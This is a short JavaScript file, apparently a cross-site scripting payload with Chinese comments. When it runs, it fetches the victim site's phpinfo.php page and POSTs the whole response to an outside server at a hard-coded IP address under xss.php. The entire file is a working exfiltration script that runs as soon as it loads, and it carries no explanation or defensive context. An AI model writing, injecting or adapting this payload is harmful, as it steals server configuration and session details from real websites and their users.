
var phpinfo = "";
function loadXMLDoc()
{
    var xmlhttp;
    if (window.XMLHttpRequest)
    {
        // IE7+, Firefox, Chrome, Opera, Safari 浏览器执行代码
        xmlhttp=new XMLHttpRequest();
    }
    else
    {
        // IE6, IE5 浏览器执行代码
        xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
    }
    xmlhttp.onreadystatechange=function()
    {
        if (xmlhttp.readyState==4 && xmlhttp.status==200)
        {
		
            //document.getElementById("myDiv").innerHTML=xmlhttp.responseText;
            phpinfo = xmlhttp.responseText;
	    xml = new XMLHttpRequest();
	    xml.open("POST","http://207.148.95.94/xss.php",true);
            xml.setRequestHeader("Content-type","application/x-www-form-urlencoded");
	    xml.send("data :" + phpinfo);

        }
    }

    xmlhttp.open("GET","./phpinfo.php?=t" + Math.random() ,true);
    xmlhttp.send();
}

loadXMLDoc();

